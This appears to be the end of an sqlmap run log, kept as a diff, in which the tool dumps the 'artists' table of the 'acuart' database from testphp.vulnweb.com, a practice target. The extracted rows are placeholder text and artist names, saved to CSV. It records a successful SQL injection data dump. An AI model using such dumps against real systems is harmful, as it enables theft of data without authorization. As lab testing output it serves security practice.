+back-end DBMS: MySQL >= 5.0
+[11:01:00] [INFO] fetching entries of column(s) 'adesc, aname' for table 'artists' in database 'acuart'
+Database: acuart
+Table: artists
+[3 entries]
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+| adesc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | aname   |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+| <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\n    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\n    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\n    Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\n    Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\n    mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\n    litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\n    Mauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p> | r4w8173 |
+| <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | Blad3   |
+| <p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>\n<p>\nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.\nSed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis\nnulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.\nCras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.\nPraesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a\nmauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad\nlitora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.\nMauris magna eros, semper a, tempor et, rutrum et, tortor.\n</p>                                                         | lyzae   |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+
+
+[11:01:02] [INFO] table 'acuart.artists' dumped to CSV file '/root/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/artists.csv'
+[11:01:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 11:01:02 /2020-10-08/
+
